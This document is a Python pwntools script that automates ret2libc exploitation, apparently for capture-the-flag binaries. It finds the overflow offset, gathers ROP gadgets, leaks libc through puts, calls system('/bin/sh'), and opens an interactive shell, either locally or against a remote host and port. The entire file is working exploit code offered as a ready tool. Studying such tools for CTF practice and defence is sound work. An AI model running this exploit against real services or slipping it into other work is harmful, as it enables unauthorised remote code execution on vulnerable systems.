from pwn import *
import subprocess
import argparse

def error_handler(chall,libc):
	if context.arch != "amd64" and context != "i386":
		log.failure("Architecture not supported!")
		exit()

	if "main" not in chall.symbols.keys():
		log.failure("debugging symbols not found!")
		exit()

	if "puts" not in chall.plt.keys():
		log.failure("puts not found in binary!")
		exit()

def start(remote,chall,libc):
	if remote == "gdb":
		return gdb.debug(chall.path,gdbscript="break vuln")
	if remote:
		return remote(remote.split(":")[0],int(remote.split(":")[1]))
	else:
		return process(chall.path, env={"LD_PRELOAD":libc.path})

def parse_input(inp):
	f = open(inp,"r")
	inputs = []
	for line in f.readlines():
		inputs.append([str(i).rstrip("\n").replace("\\n","\n") for i in line.split(" ")])
	return inputs

def send_payload(payload,inputs,io):
	for i in inputs:
		if "payload" in i[0]:
			io.sendafter(i[1],payload+i[0].lstrip("payload").encode())
		else:
			io.sendafter(i[1],i[0])

def find_gadgets(gadget,chall):
	ropg = subprocess.Popen(f"ROPgadget --binary={chall.path} --multibr".split(), stdout=subprocess.PIPE)
	grepr = subprocess.Popen(['grep', gadget], stdin=ropg.stdout,
                     stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	out,err = grepr.communicate()
	
	if out.decode() == "":
		log.failure("Required ROPgadget not found!")
		exit()

	gadg_addr = int(out.decode().split(" ")[0],16)
	log.info(gadget+" gadget-> "+hex(gadg_addr))

	return gadg_addr

def find_offset(inputs,chall,n):
	io = start(False,chall,libc)
	send_payload(cyclic(512,n=n),inputs,io)
	io.wait()
	core = io.corefile
	io.close()
	print(core.fault_addr)
	return(cyclic_find(core.fault_addr,n=n))

def pwn64(chall,libc,offset,inputs,gadgets,remote,align=False):
	pop_rdi,ret = gadgets	

	payload = flat([
		"A"*offset,
		pop_rdi, chall.got["puts"],
		chall.plt["puts"],
		chall.symbols["main"]
		])

	io = start(remote,chall,libc)
	send_payload(payload,inputs,io)

	try:
		leak = unpack(io.recvline().decode("latin-1").rstrip("\n").encode("latin-1"),48)-libc.symbols["puts"]
	except:
		log.failure("libc leak failed!")
		exit()

	log.info("Libc -> "+hex(leak))

	payload = flat([
		"A"*offset,
		pop_rdi, leak+next(libc.search(b"/bin/sh\x00")),
		leak+libc.symbols["system"]
	])

	if align:
		payload = flat([
		"A"*offset,
		pop_rdi, leak+next(libc.search(b"/bin/sh\x00")),
		ret,
		leak+libc.symbols["system"]
		])

	send_payload(payload,inputs,io)
	io.sendline("ls")
	try:
		io.recvline(timeout=5)
		log.info("Got shell!")
		io.interactive()
	except:
		if align:
			log.failure("pwn failed, even with ret!")
			io.close()
			exit()
		else:	
			log.info("pwn failed, trying with ret now")
			io.close()
			pwn64(chall,libc,offset,inputs,gadgets,remote,True)


def pwn32(chall,libc,offset,inputs,remote):

	payload = flat([
		cyclic(offset),
		chall.plt["puts"],
		chall.symbols["main"],
		chall.got["puts"],
		"BBBB"
		])
	io = start(remote,chall,libc)
	send_payload(payload,inputs,io)
	try:
		leak = unpack(io.recv(4),32)-libc.symbols["puts"]
	except:
		log.failure("libc leak failed!")
		exit()
	
	log.info("Libc -> "+hex(leak))
	payload = flat([
		cyclic(offset),
		leak+libc.symbols["system"],
		0xdeadbeef,
		leak+next(libc.search(b"/bin/sh\x00"))])
	send_payload(payload,inputs,io)
	io.sendline("ls")
	try:
		io.recvline(timeout=5)
		io.interactive()
	except:
		log.failure("pwn failed!")
		exit()


if __name__ == "__main__":
	parser = argparse.ArgumentParser(description='Solve simple ret2libc challenges',formatter_class=argparse.RawTextHelpFormatter)
	parser.add_argument("binary", help="Path to challenge binary")
	parser.add_argument("libc", help="Path to libc binary")
	parser.add_argument("-i","--input", help="""File with input text to be given to binary before payload. Format:
		<input1> <output_before_input1>
		<input2> <output_before_input2>	
		payload <output_before_payload_entry>
		
		Note: append '\\n' to required input and output strings""")
	parser.add_argument("-r","--remote", help="<remote_ip>:<port>")
	args = parser.parse_args()

	if args.input != None:
		inputs = parse_input(args.input)
	else:
		inputs = [["payload",""]]

	chall = context.binary = ELF(args.binary)
	libc = ELF(args.libc)
	#context.log_level = "debug"
	
	if context.arch == "amd64":
		offset = find_offset(inputs,chall,8)
		log.info("RIP offset -> "+hex(offset))
		gadgets = find_gadgets("pop rdi ; ret",chall),find_gadgets(": ret",chall)
		pwn64(chall,libc,offset,inputs,gadgets,args.remote)
	else:
		offset = find_offset(inputs,chall,4)
		log.info("EIP offset -> "+hex(offset))
		pwn32(chall,libc,offset,inputs,args.remote)